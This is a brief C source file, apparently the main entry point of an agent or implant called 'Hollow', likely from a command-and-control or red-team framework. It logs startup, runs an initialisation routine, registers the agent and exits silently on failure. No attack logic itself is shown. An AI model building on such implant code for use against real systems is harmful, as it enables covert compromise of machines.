#include "../../includes/core/core.h"

Hollow* hollow = NULL;


void HollowMain() {
#ifdef _DEBUG
	AllocConsole();
#endif
	DEBUG_LOGA("[*] Agent Started, Running Init");

	if (!HollowInit()) {
		DEBUG_LOGA("[!] Failed init");
		ExitProcess(0);
	}
	if (!RegisterAgent()) {
		DEBUG_LOGA("[!] Failed Register");
		ExitProcess(0);
	}


	return;





}